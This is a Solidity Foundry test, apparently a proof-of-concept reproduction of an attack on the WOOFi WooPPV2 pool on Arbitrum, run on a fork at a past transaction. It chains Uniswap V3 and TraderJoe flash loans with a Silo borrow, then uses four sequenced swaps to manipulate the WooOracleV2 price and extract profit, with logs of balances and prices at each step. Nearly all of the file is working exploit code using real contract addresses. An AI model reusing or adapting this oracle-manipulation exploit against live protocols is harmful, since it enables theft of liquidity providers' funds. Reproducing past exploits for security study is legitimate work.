// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.20;

import {Test, console} from "lib/forge-std/src/Test.sol";

import {IERC20} from 'lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol';

import './interfaces/ITraderJoe.sol';
import './interfaces/ISilo.sol';
import './interfaces/IUniSwapV3Pool.sol';
import './interfaces/IWooPPV2.sol';
import './interfaces/IWETH.sol';
import './interfaces/IWooOracleV2.sol';



/// @title Flash contract implementation
/// @notice An example contract using the Uniswap V3 flash function
contract WOOFiAttacker is Test {
    address constant USDC = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
    address constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address constant WOO = 0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b;
    ITraderJoe constant TRADERJOE = ITraderJoe(0xB87495219C432fc85161e4283DfF131692A528BD);
    ISilo constant SILO = ISilo(0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F);
    IWooPPV2 constant WOOPPV2 = IWooPPV2(0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062);
    IWooOracleV2 constant WOOORACLEV2 = IWooOracleV2(0x73504eaCB100c7576146618DC306c97454CB3620);
    IUniswapV3Pool constant POOL = IUniswapV3Pool(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);
    uint256 max = type(uint256).max;
    uint256 uniSwapFlashAmount;
    uint256 traderJoeFlashAmount;

    enum Action {
        NORMAL,
        REENTRANT
    }

    function setUp() public {
        bytes32 txHash = 0x57e555328b7def90e1fc2a0f7aa6df8d601a8f15803800a5aaf0a20382f21fbd;
        vm.createSelectFork("arb", txHash);
    }

    /// @param fee0 The fee from calling flash for token0
    /// @param fee1 The fee from calling flash for token1
    /// @param data The data needed in the callback passed as FlashCallbackData from `initFlash`
    /// @notice implements the callback called from flash
    /// @dev fails if the flash is not profitable, meaning the amountOut from the flash is less than the amount borrowed
    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        // ILBFlashLoanCallback receiver, bytes32 amounts, bytes calldata data
        // flash loan WOO
        traderJoeFlashAmount = IERC20(WOO).balanceOf(address(TRADERJOE));
        console.log("TJ Flash Amount: ", traderJoeFlashAmount, "WOO");
        console.log("");
        bytes32 hashAmount = bytes32(traderJoeFlashAmount);
        TRADERJOE.flashLoan(ILBFlashLoanCallback(address(this)), hashAmount, new bytes(0));
        IERC20(USDC).transfer(msg.sender, uniSwapFlashAmount + fee1);
    }

    function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes calldata data) external {
        IERC20(USDC).transfer(address(POOL), uint256(amount1));
    }

    function LBFlashLoanCallback(
        address sender,
        IERC20 tokenX,
        IERC20 tokenY,
        bytes32 amounts,
        bytes32 totalFees,
        bytes calldata data
    ) external returns (bytes32) {
        // deposit USDC and borrow all the WOO liquidity (idk if Woo oracle  using Silo for pricing or whether this is just to get even bigger WOO balance)
        SILO.deposit(USDC, 7000000000000, true);
        uint256 amount = SILO.liquidity(WOO);
        SILO.borrow(WOO, amount);

        console.log("Oracle prices before swapping:");
        console.log("USDC: ", _getPrice(USDC));
        console.log("WOO: ", _getPrice(WOO));
        console.log("WETH: ", _getPrice(WETH));
        console.log("USDC balance:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
        console.log("WOO balance:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
        console.log("WETH balance:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
        console.log("USDC Reserve: ", _getTokenInfo(USDC) / 1e6);
        console.log("WOO Reserve: ", _getTokenInfo(WOO) / 1e18);
        console.log("WETH Reserve: ", _getTokenInfo(WETH) / 1e18);
        console.log("");

        // 4 consecutive swaps (to mess with pricing updates):
        // Sets up the WOO to be cheap
        // 1. USDC -> WETH
        IERC20(USDC).transfer(address(WOOPPV2), 2000000000000);
        WOOPPV2.swap(USDC, WETH, 2000000000000, 0, address(this), address(this));
        console.log("Oracle prices after swapping USDC -> WETH:");
        console.log("USDC: ", _getPrice(USDC));
        console.log("WOO: ", _getPrice(WOO));
        console.log("WETH: ", _getPrice(WETH));
        console.log("USDC balance:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
        console.log("WOO balance:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
        console.log("WETH balance:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
        console.log("USDC Reserve: ", _getTokenInfo(USDC) / 1e6);
        console.log("WOO Reserve: ", _getTokenInfo(WOO) / 1e18);
        console.log("WETH Reserve: ", _getTokenInfo(WETH) / 1e18);
        console.log("");
        // 2. USDC -> WOO 
        IERC20(USDC).transfer(address(WOOPPV2), 100000000000);
        WOOPPV2.swap(USDC, WOO, 100000000000, 0, address(this), address(this));
        console.log("Oracle prices after swapping USDC -> WOO:");
        console.log("USDC: ", _getPrice(USDC));
        console.log("WOO: ", _getPrice(WOO));
        console.log("WETH: ", _getPrice(WETH));
        console.log("USDC balance:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
        console.log("WOO balance:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
        console.log("WETH balance:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
        console.log("USDC Reserve: ", _getTokenInfo(USDC) / 1e6);
        console.log("WOO Reserve: ", _getTokenInfo(WOO) / 1e18);
        console.log("WETH Reserve: ", _getTokenInfo(WETH) / 1e18);
        console.log("");
        // 3. WOO -> USDC
        IERC20(WOO).transfer(address(WOOPPV2), 7856868800000000000000000);
        WOOPPV2.swap(WOO, USDC, 7856868800000000000000000, 0, address(this), address(this));
        console.log("Oracle prices after swapping WOO -> USDC:");
        console.log("USDC: ", _getPrice(USDC));
        console.log("WOO: ", _getPrice(WOO));
        console.log("WETH: ", _getPrice(WETH));
        console.log("USDC balance:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
        console.log("WOO balance:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
        console.log("WETH balance:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
        console.log("USDC Reserve: ", _getTokenInfo(USDC) / 1e6);
        console.log("WOO Reserve: ", _getTokenInfo(WOO) / 1e18);
        console.log("WETH Reserve: ", _getTokenInfo(WETH) / 1e18);
        console.log("");
        // 4. USDC -> WOO // reap the rewards
        IERC20(USDC).transfer(address(WOOPPV2), 926342);
        WOOPPV2.swap(USDC, WOO, 926342, 0, address(this), address(this));
        console.log("Oracle prices after swapping USDC -> WOO:");
        console.log("USDC: ", _getPrice(USDC));
        console.log("WOO: ", _getPrice(WOO));
        console.log("WETH: ", _getPrice(WETH));
        console.log("USDC balance:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
        console.log("WOO balance:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
        console.log("WETH balance:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
        console.log("USDC Reserve: ", _getTokenInfo(USDC) / 1e6);
        console.log("WOO Reserve: ", _getTokenInfo(WOO) / 1e18);
        console.log("WETH Reserve: ", _getTokenInfo(WETH) / 1e18);
        console.log("");
        // repay WOO loan, receive USDC
        SILO.repay(WOO, max);
        SILO.withdraw(USDC, max, true);
        // NOTE: calculate this
        IERC20(WOO).transfer(msg.sender, uint256(amounts) + uint256(totalFees));
        // repay WOO flash loan & repay USDC flash loan automatically 
        bytes32 rData = keccak256("LBPair.onFlashLoan");
        return rData;
    }

    /// @notice Calls the pools flash function with data needed in `uniswapV3FlashCallback`
    function initFlash() public {
        // inital approvals required for the tokens 
        IERC20(WOO).approve(address(WOOPPV2), max);
        IERC20(WOO).approve(address(SILO), max);
        IERC20(USDC).approve(address(SILO), max);
        IERC20(USDC).approve(address(WOOPPV2), max);
        // get the USDC balance of the UniSwap pool
        uniSwapFlashAmount = IERC20(USDC).balanceOf(address(POOL));
        console.log("");
        console.log("UniSwap Flash Amount: ", uniSwapFlashAmount, "USDC");
        // flash loan USDC
        POOL.flash(
            address(this),
            0,
            uniSwapFlashAmount,
            abi.encode(uint256(1))
        );
        // swap excess USDC for WETH
        int256 swapAmount = int256(IERC20(USDC).balanceOf(address(this)));
        POOL.swap(address(this), false, swapAmount, 5148059652436460709226212, new bytes(0));
        // send excess WOO to another address (which converts to ETH)
        uint256 excessWETHBalance = IERC20(WETH).balanceOf(address(this));
        IWETH(WETH).withdraw(excessWETHBalance);
        uint256 excessWOOBalance = IERC20(WOO).balanceOf(address(this));
        //IERC20(WOO).transfer({some_other_address}, excessWOOBalance); // would only need to do this if sending to an attaker EOA
    }

    function testAttack() public {
        console.log("Attacker's balance before attack:");
        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
        uint256 ethBalanceBefore = address(this).balance;
        console.log("ETH:", ethBalanceBefore / 1e18, "ETH");
        
        console.log("");
        initFlash();
        console.log("Attacker's balance after attack:");
        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
        uint256 ethBalanceAfter = address(this).balance;
        console.log("ETH (profit):", (ethBalanceAfter - ethBalanceBefore) / 1e18, "ETH");

    }

    receive() external payable {}

    function _getPrice(address asset) internal view returns (uint256) {
        (uint256 priceNow, bool feasible) = WOOORACLEV2.price(asset);
        return priceNow;
    }

    function _getTokenInfo(address token) internal view returns (uint192) {
        IWooPPV2.TokenInfo memory tokenInfo = WOOPPV2.tokenInfos(token);
        return tokenInfo.reserve;
    }
    
}
